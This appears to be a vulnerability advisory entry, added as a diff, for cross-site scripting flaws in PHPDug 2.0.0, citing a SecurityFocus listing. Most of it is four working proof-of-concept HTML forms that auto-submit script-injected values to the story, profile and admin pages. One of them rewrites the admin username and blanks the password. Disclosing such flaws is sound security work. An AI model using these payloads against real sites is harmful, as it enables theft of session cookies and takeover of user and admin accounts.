@@ -1,0 +1,49 @@
+source: http://www.securityfocus.com/bid/47733/info
+
+PHPDug is prone to multiple cross-site scripting vulnerabilities because it fails to properly sanitize user-supplied input.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may let the attacker steal cookie-based authentication credentials and launch other attacks.
+
+PHPDug 2.0.0 is vulnerable; other versions may also be affected. 
+
+1.
+<form action="http://www.example.com/add_story.php" method="post" name="main">
+<input type="hidden" name="story_url" value=&#039;http://www.example.com/"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="Submit" value="Continue">
+</form>
+<script>
+document.main.submit();
+</script>
+
+2.
+<form action="http://www.example.com/editprofile.php" method="post" name="main">
+<input type="hidden" name="email" value=&#039;email@example.com"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="commentst" value="-4">
+<input type="hidden" name="Submit" value="Save Changes">
+</form>
+<script>
+document.main.submit();
+</script>
+
+3.
+<form action="http://www.example.com/adm/content_add.php" method="post" name="main">
+<input type="hidden" name="id" value="999">
+<input type="hidden" name="title" value=&#039;page"><script>alert(document.cookie)</script>&#039;>
+<input type="hidden" name="contentvalue="content">
+<input type="hidden" name="Submit" value="Submit">
+</form>
+<script>
+document.main.submit();
+</script>
+
+4.
+<form action="http://www.example.com/adm/admin_edit.php" method="post" name="main">
+<input type="hidden" name="id[1]" value="1">
+<input type="hidden" name="username[1]" value=&#039;admin<script>alert("XSS")</script>&#039;>
+<input type="hidden" name="password[1]" value="">
+<input type="hidden" name="Submit" value="Submit">
+</form>
+<script>
+document.main.submit();
+</script>
+
